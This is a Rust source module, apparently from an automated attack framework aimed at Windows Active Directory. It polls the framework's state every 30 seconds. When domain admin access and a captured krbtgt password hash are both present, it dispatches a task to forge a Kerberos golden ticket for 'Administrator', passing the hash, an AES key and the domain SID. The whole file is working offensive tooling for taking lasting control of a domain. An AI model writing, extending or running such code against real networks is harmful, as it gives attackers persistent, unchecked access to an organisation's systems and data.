//! auto_golden_ticket -- monitor for krbtgt hash and forge golden ticket.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::dispatcher::Dispatcher;

/// Monitors for krbtgt hash and triggers golden ticket forging.
/// Interval: 30s. Matches Python `_auto_golden_ticket`.
pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let state = dispatcher.state.read().await;

        // Skip if already have golden ticket
        if state.has_golden_ticket {
            continue;
        }

        // Skip if no domain admin yet
        if !state.has_domain_admin {
            continue;
        }

        // Look for krbtgt hash
        let krbtgt_hash = state
            .hashes
            .iter()
            .find(|h| h.username.to_lowercase() == "krbtgt");

        let krbtgt = match krbtgt_hash {
            Some(h) => h.clone(),
            None => continue,
        };

        let domain = if !krbtgt.domain.is_empty() {
            krbtgt.domain.clone()
        } else {
            match state.domains.first() {
                Some(d) => d.clone(),
                None => continue,
            }
        };

        // Check for domain SID
        let domain_sid = state.domain_sids.get(&domain.to_lowercase()).cloned();

        drop(state);

        // Submit golden ticket forging task
        let mut payload = json!({
            "technique": "golden_ticket",
            "domain": domain,
            "krbtgt_hash": krbtgt.hash_value,
            "username": "Administrator",
        });
        if let Some(sid) = domain_sid {
            payload["domain_sid"] = json!(sid);
        }
        if let Some(ref aes) = krbtgt.aes_key {
            payload["aes_key"] = json!(aes);
        }

        match dispatcher
            .throttled_submit("exploit", "privesc", payload, 1)
            .await
        {
            Ok(Some(task_id)) => {
                info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
            }
            Ok(None) => {}
            Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
        }
    }
}
